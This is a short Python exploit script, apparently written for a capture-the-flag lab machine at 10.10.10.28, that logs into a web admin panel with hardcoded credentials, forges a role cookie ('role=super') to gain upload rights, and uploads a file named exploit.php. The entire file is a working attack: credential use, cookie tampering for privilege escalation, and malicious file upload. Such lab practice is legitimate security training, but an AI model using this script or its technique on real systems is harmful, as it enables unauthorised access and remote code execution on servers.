#!/bin/python3
import requests

# LOGIN

login_url = "http://10.10.10.28/cdn-cgi/login/index.php"

login_data = {
        'username' : 'admin',
        'password' : 'MEGACORP_4dm1n!!'
        }

login_session = requests.session()

login_request = login_session.post(login_url, data=login_data)

# CHANGE COOKIE AT UPLOADS

upload_cookie = {
        'Cookie' : { 
            'user': '86575',
            'role' : 'super'
            }
        }

upload_url = 'http://10.10.10.28/cdn-cgi/login/admin.php?content=uploads&action=upload'

upload_cookie = { 
        'Cookie' : 'user=86575; role=super',
        }

exploit = { 
        'exploit.php' : open('exploit.php', 'rb')
        }


upload_request = login_session.post(upload_url, headers=upload_cookie, files= exploit)

print(upload_request.request.headers)

print(upload_request.text)
